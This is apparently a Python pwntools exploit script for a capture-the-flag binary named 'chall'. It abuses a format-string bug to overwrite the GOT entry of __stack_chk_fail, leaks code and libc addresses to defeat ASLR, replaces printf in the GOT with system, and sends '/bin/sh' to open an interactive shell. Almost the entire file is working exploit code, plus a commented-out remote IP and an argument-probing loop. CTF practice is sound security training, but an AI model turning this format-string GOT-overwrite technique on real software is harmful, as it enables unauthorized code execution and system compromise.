from pwn import *
import time
context.arch = 'amd64'
context.aslr = 'false'

elf = ELF("./chall")

r = elf.process()

#r = gdb.debug('./chall',aslr=False, gdbscript='b vuln')
#r=remote("34.29.214.123", 5000)
r=remote("127.0.0.1", 5000)
got_read_base = elf.got['read']
got_printf_base = elf.got['printf']

#gdb.attach(r,"""
#        set follow-fork-mode child
#        info proc mappings
#        break main
#            """)
#9th argument is the addr main+44(0x1275)
#overwrite it with the got of stack check fail to vuln
log.info("overwrite got of stack check fail to vuln")
stack_check_fail_symtab_offset = 0x8018
vuln_entry = 0x11f0 + 0x8018-0x4018
payload = b'%'
payload += str(vuln_entry).encode('utf-8')
payload += b'c%9$hn'
payload += b','*(8-(len(payload)%8)+1)
payload += p16(stack_check_fail_symtab_offset)

r.send(payload)

print(r.recv())
print(r.recv())

#leak vuln_leave 0x1247
log.info("leak vuln_leave 0x1247 ")
vuln_leave = 0x1247
payload = b'#%9$p'
print(payload)
r.send(payload)
ret = r.recvuntil('#')
ret = r.recv()
print(ret)
vuln_leave_r = int(ret[2:14],16)
log.info(f"leak vuln_leave 0x1247 {hex(vuln_leave_r)}")



base_bss = vuln_leave_r-vuln_leave

#leak read from got 
log.info("leak libc read from got ")
got_read = base_bss + got_read_base
payload = b'%8$s,'
payload += b','*(8-(len(payload)%8)+1)
payload +=p64(got_read)

r.send(payload)
ret = r.recv()

libc_read = int.from_bytes(ret[0:6], byteorder='little')
log.info(f"leak libc read from got[{hex(got_read)}] :{hex(libc_read)}")
print(ret)

#leak printf from got 
#time.sleep(30)
#log.info("leak libc printf from got ")
got_printf = base_bss + got_printf_base
#payload = b'%8$s\00'
#payload += b','*(8-(len(payload)%8)+1)
#payload +=p64(got_printf)

#r.send(payload)
#ret = r.recv()

#libc_printf = int.from_bytes(ret[0:6], byteorder='little')
#log.info(f"leak libc printf from got[{hex(got_printf)}] :{hex(libc_printf)}")
#print(ret)

#get libc

#read_last_three_bytes = libc_read & 0xFFFFFF
#printf_last_three_bytes = libc_printf & 0xFFFFFF
#filename = pwnlib.libcdb.search_by_symbol_offsets({'read': read_last_three_bytes, 'printf':printf_last_three_bytes}, select_index=2)
#libc = ELF(filename)

#read = libc.symbols["read"]
#libc_base = libc_read - read
#printf = libc.symbols["printf"]
#libc_base2 = libc_printf - printf

#if libc_base!=libc_base2:
#	print("libc_base!=libc_base2")

libc = ELF("./libc.so.6")
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
read = libc.symbols["read"]
libc_base = libc_read - read
# replace printf with system

system=libc.symbols['system']
printf=libc.symbols['printf']
libc_system = libc_base + system
libc_printf = libc_base + printf

log.info(f"libc_system : {hex(libc_system)}")
log.info(f"libc_printf : {hex(libc_printf)}")
#time.sleep(30)
system_last_2_bytes = libc_system & 0xFFFF
system_last_3_byte = (libc_system >> 16)&0xFF

payload = b'%'
payload += str(system_last_3_byte).encode('utf-8')
payload += b'c%12$hhn%'
payload += str(system_last_2_bytes-system_last_3_byte).encode('utf-8')
payload += b'c%11$hn'

payload += b','*(8-(len(payload)%8)+1)
payload += p64(got_printf)
payload += p64(got_printf+2)
r.send(payload)

print(r.recv())

#send /bin/sh
payload = b'/bin/sh\00'
r.send(payload)
print(r.recv())
r.interactive()

'''
print(r.recv())


for i in range(50):
    r = elf.process()

    #gdb.attach(r,"""
    #        break main
    #            """)
    #9th argument is the addr main+44(0x1275)
    #overwrite it with the symtab of stack check fail to read

    payload = b'%'
    payload += str(i).encode('utf-8')
    payload +=b'$p\00'
    r.sendline(payload)

    print(f'the {i}th argument')
    print(r.recv())
'''

